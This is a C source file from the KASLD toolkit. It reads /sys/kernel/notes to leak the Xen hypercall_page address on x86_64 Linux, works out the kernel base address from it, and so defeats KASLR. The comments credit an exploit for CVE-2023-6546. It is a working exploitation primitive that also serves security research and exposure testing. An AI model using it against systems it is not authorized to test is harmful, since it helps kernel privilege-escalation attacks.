// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve Xen symbols from the kernel ELF .notes section on x86_64 kernels
// with Xen support (Debian and Ubuntu by default) via SysFS /sys/kernel/notes.
//
// Discovered by Nassim-Asrir (@p1k4l4) and exploited in CVE-2023-6546.
// https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
//
// /sys/kernel/notes was introduced in kernel v2.6.23-rc1~389 on 2007-07-20:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=da1a679cde9b12d6e331f43d2d92a234f2d1f9b0
//
// Xen ELF notes were introduced in kernel v2.6.23-rc1~498^2~25 on 2007-07-19:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=5ead97c84fa7d63a6a7a2f4e9f18f452bd109045
//
// Requires:
// - Readable /sys/kernel/notes
// - CONFIG_XEN=y
//
// References:
// https://cateee.net/lkddb/web-lkddb/XEN.html
// https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long get_kernel_addr_kernel_notes_xen_entry() {
  int fd;
  unsigned int namesz, descsz, type, pad;
  char name[256];
  char desc[256];
  unsigned long addr = 0;

  printf("[.] checking /sys/kernel/notes ...\n");

  fd = open("/sys/kernel/notes", O_RDONLY);

  if (fd < 0) {
    perror("[-] open(/sys/kernel/notes)");
    close(fd);
    return 0;
  }

  // modified kernel ELF notes parsing from Nassim Asrir's exploit:
  // https://github.com/Nassim-Asrir/ZDI-24-020/blob/a267e27f5868a975e767794cf77b3092acff4a26/exploit.c#L421
  while (1) {
    if (read(fd, &namesz, sizeof namesz) != sizeof namesz)
      break;

    // printf("namesz: %u\n", namesz);

    if (namesz == 0)
      continue;

    if (namesz > sizeof name)
      break;

    if (read(fd, &descsz, sizeof descsz) != sizeof descsz)
      break;

    // printf("descsz: %u\n", descsz);

    if (descsz == 0)
      continue;

    if (descsz > sizeof desc)
      break;

    if (read(fd, &type, sizeof type) != sizeof type)
      break;

    // printf("type: %u\n", type);

    if (read(fd, &name, namesz) != namesz)
      break;

    // printf("name: %s\n", name);

    if (read(fd, &desc, descsz) != descsz)
      break;

    // printf("desc: %s\n", desc);

    if (strcmp(name, "Xen") == 0 && type == 2 && descsz == 8) {
      addr = *(unsigned long *)&desc;
      // printf("addr: %lx\n", addr);
      break;
    }

    pad = 4 - ((namesz + descsz) % 4);
    if (pad < 4)
      if (read(fd, &name, pad) != pad)
        break;
  }

  close(fd);

  if (!addr) {
    printf("[-] Could not find Xen address in ELF notes\n");
    return 0;
  }

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  printf("[-] Invalid Xen address in ELF notes: %lx\n", addr);

  return 0;
}

int main() {
  unsigned long addr = get_kernel_addr_kernel_notes_xen_entry();

  if (!addr)
    return 1;

  printf("leaked Xen hypercall_page address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  // NOTE: Calculated base address is off by +0x100_0000 on 6.x kernels.
  // * Ubuntu 22.04 kernel 6.2.0-39-generic
  // * Ubuntu 22.04 kernel 6.5.0-15-generic

  return 0;
}
